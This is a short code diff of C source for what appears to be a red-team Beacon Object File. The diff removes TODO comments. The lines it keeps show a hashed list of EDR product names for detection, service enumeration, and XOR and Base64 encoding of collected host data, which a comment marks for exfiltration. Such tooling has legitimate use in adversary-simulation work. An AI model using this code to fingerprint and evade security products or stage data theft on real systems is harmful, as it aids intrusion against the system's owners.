@@ -1,9 +1,4 @@
 /*
-	To do 1: replace some WinAPIs for safer alternatives similar to C Runtime functions.
-	To do 2: Utilize VX-API functions
-	To do 3: Utilize function obfuscations
-	To do 4: 
-	
   Credits:
     - John Hammond BOF Tutorial
 	- @cocomelonc : MalDev for Ethical Hackers
@@ -45,8 +40,6 @@ typedef struct {
 
 int process_count = 0;
 
-
-// To do: Hash this then do pattern matching [/]
 // Hash version of each of the elemeent in the EDR list:
 BYTE edrListHash[MAX_EDR_STRINGS][MAX_EDR_STRING_LENGTH] = {
     0xB3FD5047, 0x10BE3B80, 0xCEC62B78, 0xA9753030, 0xFCDF2DFB, 0x3364E832,
@@ -490,11 +483,7 @@ void checkServices() {
 	// XOR encrypts the collected information to be exfiltrated
 	XORcrypt((char *) collectedStr, MSVCRT$strlen(collectedStr), XORKEY);
 
-	// To do: Base64 encode the XOR encrypted information
 	Base64EncodeA(&collectedStr, MSVCRT$strlen(collectedStr), collectedStr, MSVCRT$strlen(collectedStr));
-
-	// To do: Create a blob file containing the encoded+encrypted information
-	// Use WinAPI for file creation in here!
 	
     MSVCRT$free(services);
     CloseServiceHandle_t pCloseServiceHandle = NULL;
@@ -529,10 +518,6 @@ void go(char *args, int alen) {
 	// Proclist should be the first argument in here.
 	// This Harcoded string is only used for testing.
 	checkServices();
-
-	// To do 1: Encrypt the information to a .bmp file with a simple AES encryption
-	// To do 2: To be exfiltrated by a different BOF capability (BMP)
-	
 	
 	return;
 }
